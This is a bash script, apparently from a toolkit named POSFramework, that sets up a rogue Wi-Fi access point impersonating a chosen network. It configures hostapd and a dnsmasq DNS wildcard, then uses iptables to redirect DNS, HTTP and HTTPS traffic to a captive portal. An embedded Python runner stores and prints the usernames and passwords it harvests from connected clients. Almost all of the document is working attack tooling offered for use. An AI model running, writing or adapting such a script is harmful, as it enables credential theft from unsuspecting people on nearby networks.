#!/bin/bash
# ============================================================================
# POSFramework Rogue AP Deployment Script
# ============================================================================
# Integrated startup for complete rogue AP with credential capture
# ============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
INTERFACE="${1:-wlan1}"
TARGET_SSID="${2:-}"
TARGET_CHANNEL="${3:-6}"
ENABLE_WPA="${4:-false}"
WPA_PASSPHRASE="${5:-}"
DURATION="${6:-300}"  # 5 minutes default
DB_FILE="pos_recon_data.db"
GATEWAY_IP="10.0.0.1"
PORTAL_PORT="80"

error() {
    echo -e "${RED}[!]${NC} $1"
    exit 1
}

log() {
    echo -e "${GREEN}[+]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[*]${NC} $1"
}

info() {
    echo -e "${BLUE}[i]${NC} $1"
}

# Banner
clear
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║      POSFramework - Rogue Access Point Deployment Tool       ║"
echo "║                    Credential Harvesting                      ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# Check prerequisites
if [[ $EUID -ne 0 ]]; then
    error "This script must be run with sudo"
fi

if [[ -z "$TARGET_SSID" ]]; then
    error "Usage: sudo $0 <interface> <target_ssid> <channel> [enable_wpa] [wpa_pass] [duration]"
fi

# Verify interface exists
if ! ip link show "$INTERFACE" &>/dev/null; then
    error "Interface $INTERFACE not found"
fi

log "Configuration Summary:"
echo "┌─────────────────────────────────────────────────────────────┐"
echo "│ Interface:      $INTERFACE"
echo "│ Target SSID:    $TARGET_SSID"
echo "│ Channel:        $TARGET_CHANNEL"
echo "│ WPA2:           $ENABLE_WPA"
echo "│ Duration:       ${DURATION}s"
echo "│ Gateway IP:     $GATEWAY_IP"
echo "│ Database:       $DB_FILE"
echo "└─────────────────────────────────────────────────────────────┘"
echo ""

# Confirmation
echo -e "${YELLOW}Press Enter to proceed, Ctrl+C to cancel...${NC}"
read -r

# Check dependencies
warn "Checking dependencies..."
for cmd in hostapd dnsmasq iptables python3; do
    if ! command -v "$cmd" &> /dev/null; then
        error "$cmd not installed. Run: sudo bash $SCRIPT_DIR/hostapd_setup.sh"
    fi
done
log "All dependencies found"

# Step 1: Bring down interface and flush config
warn "Preparing network interface..."
ip link set "$INTERFACE" down 2>/dev/null || true
ip addr flush dev "$INTERFACE" 2>/dev/null || true
sleep 0.5
ip link set "$INTERFACE" up

# Step 2: Configure interface
warn "Configuring $INTERFACE with IP $GATEWAY_IP/24..."
ip addr add "$GATEWAY_IP/24" dev "$INTERFACE" 2>/dev/null || true

# Verify interface is up
if ! ip addr show "$INTERFACE" | grep -q "$GATEWAY_IP"; then
    error "Failed to configure interface $INTERFACE"
fi
log "Interface configured"

# Step 3: Generate hostapd configuration
warn "Generating hostapd configuration..."
HOSTAPD_CONF="/tmp/hostapd-rogue.conf"

cat > "$HOSTAPD_CONF" << HOSTCONF
interface=$INTERFACE
driver=nl80211
country_code=US
ssid=$TARGET_SSID
channel=$TARGET_CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
beacon_int=100
max_num_sta=255
macaddr_acl=0
auth_algs=1
HOSTCONF

if [[ "$ENABLE_WPA" == "true" ]] && [[ -n "$WPA_PASSPHRASE" ]]; then
    cat >> "$HOSTAPD_CONF" << WPACONF
wpa=2
wpa_passphrase=$WPA_PASSPHRASE
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
WPACONF
    log "WPA2-PSK enabled: $WPA_PASSPHRASE"
else
    echo "wpa=0" >> "$HOSTAPD_CONF"
    log "Open network (no authentication)"
fi

# Step 4: Start hostapd
warn "Starting hostapd..."
if hostapd -B "$HOSTAPD_CONF" 2>/dev/null; then
    log "hostapd started"
    sleep 2
else
    error "Failed to start hostapd"
fi

# Verify hostapd is running
if ! pgrep -x hostapd > /dev/null; then
    error "hostapd process not found - startup failed"
fi

# Step 5: Generate dnsmasq configuration
warn "Generating dnsmasq configuration..."
DNSMASQ_CONF="/tmp/dnsmasq-rogue.conf"

cat > "$DNSMASQ_CONF" << DNSCONF
no-resolv
interface=$INTERFACE
bind-interfaces
dhcp-range=10.0.0.2,10.0.0.100,12h
dhcp-option=option:router,$GATEWAY_IP
dhcp-option=option:dns-server,$GATEWAY_IP
address=/#/$GATEWAY_IP
log-queries
log-facility=/var/log/dnsmasq.log
cache-size=1024
DNSCONF

# Step 6: Start dnsmasq
warn "Starting dnsmasq (DNS/DHCP)..."
if dnsmasq -C "$DNSMASQ_CONF" 2>/dev/null; then
    log "dnsmasq started"
    sleep 1
else
    error "Failed to start dnsmasq"
fi

# Step 7: Setup iptables
warn "Configuring iptables for traffic redirect..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush rules
iptables -F 2>/dev/null || true
iptables -t nat -F 2>/dev/null || true

# DNS redirect
iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 \
    -j DNAT --to-destination "$GATEWAY_IP:53" 2>/dev/null || true
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 \
    -j DNAT --to-destination "$GATEWAY_IP:53" 2>/dev/null || true

# HTTP/HTTPS redirect to captive portal
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 \
    -j DNAT --to-destination "$GATEWAY_IP:$PORTAL_PORT" 2>/dev/null || true
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 \
    -j DNAT --to-destination "$GATEWAY_IP:$PORTAL_PORT" 2>/dev/null || true

log "iptables configured"

# Step 8: Start POSFramework
warn "Starting POSFramework credential harvesting..."
echo ""

cat > /tmp/posframework_ap_runner.py << 'PYEOF'
import sys
import time
import signal
from pathlib import Path

# Add posframework to path
sys.path.insert(0, str(Path(__file__).parent.parent / "posframework"))

from posframework.database import POSDatabase
from posframework.rogueap import RogueAPEngine
from posframework.config import log

class APManager:
    def __init__(self):
        self.rogue_ap = None
        self.db = None
        self.running = True
    
    def signal_handler(self, sig, frame):
        log.info("Shutting down Rogue AP...")
        self.running = False
        if self.rogue_ap:
            self.rogue_ap.stop()
        sys.exit(0)
    
    def run(self, interface, duration):
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        try:
            # Initialize database
            self.db = POSDatabase("pos_recon_data.db")
            log.info("Database initialized")
            
            # Create rogue AP from command line config
            self.rogue_ap = RogueAPEngine(
                interface=interface,
                ssid="FreeWiFi",
                channel="6",
                db=self.db
            )
            
            # Start AP
            if not self.rogue_ap.start():
                log.error("Failed to start rogue AP")
                return False
            
            log.info(f"Rogue AP running for {duration} seconds...")
            log.info("Waiting for client connections and credential capture...")
            
            # Run for specified duration
            elapsed = 0
            while self.running and elapsed < duration:
                time.sleep(1)
                elapsed += 1
            
            # Cleanup
            if self.rogue_ap:
                self.rogue_ap.stop()
            
            log.info("Rogue AP stopped")
            
            # Display captured credentials
            if self.db:
                creds = self.db.cursor.execute(
                    'SELECT timestamp, ip_address, username, password FROM credentials'
                ).fetchall()
                
                if creds:
                    log.info(f"Captured {len(creds)} credential(s)")
                    for ts, ip, user, passwd in creds:
                        log.info(f"  [{ts}] {ip} - {user}:{passwd}")
            
            return True
            
        except Exception as e:
            log.error(f"Error: {e}")
            if self.rogue_ap:
                self.rogue_ap.stop()
            return False

if __name__ == "__main__":
    interface = sys.argv[1] if len(sys.argv) > 1 else "wlan1"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    
    manager = APManager()
    manager.run(interface, duration)
PYEOF

cd "$SCRIPT_DIR" || error "Failed to change directory"

# Run POSFramework with timeout
timeout "$DURATION" python3 /tmp/posframework_ap_runner.py "$INTERFACE" "$DURATION" || true

# Step 9: Cleanup
warn "Cleaning up..."

# Stop services
killall hostapd 2>/dev/null || true
killall dnsmasq 2>/dev/null || true

# Flush iptables
iptables -F 2>/dev/null || true
iptables -t nat -F 2>/dev/null || true

# Remove temporary files
rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF" /tmp/posframework_ap_runner.py

log "Cleanup complete"

# Summary
echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                    Deployment Complete                        ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
log "Rogue AP deployment finished"

# Show results
if [[ -f "$DB_FILE" ]]; then
    log "Database: $DB_FILE"
    
    # Query captured credentials
    CRED_COUNT=$(sqlite3 "$DB_FILE" "SELECT COUNT(*) FROM credentials;" 2>/dev/null || echo "0")
    log "Credentials captured: $CRED_COUNT"
fi

echo ""
echo "To view captured data:"
echo "  python3 -m posframework --analyze-recon"
echo "  sqlite3 $DB_FILE '.tables'"
echo ""

exit 0
